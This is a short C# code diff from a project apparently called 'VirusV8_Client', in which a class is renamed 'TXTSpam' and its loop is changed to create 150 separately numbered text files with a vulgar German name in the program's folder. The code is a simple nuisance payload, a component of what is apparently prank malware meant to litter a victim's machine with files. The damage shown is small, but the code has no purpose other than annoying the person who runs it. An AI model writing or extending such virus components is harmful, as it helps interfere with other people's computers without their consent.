@@ -8,15 +8,15 @@ using System.Windows.Forms;
 
 namespace VirusV8_Client.Funktionen
 {
-    public class DesktopTXT
+    public class TXTSpam
     {
-        public DesktopTXT()
+        public TXTSpam()
         {
             for (int i = 0; i < 150; i++)
             {
                 try
                 {
-                    File.Create(Application.StartupPath + @"\Arsch.txt");
+                    File.Create(Application.StartupPath + @"\Arsch" + i.ToString() + ".txt");
                 }
                 catch
                 {
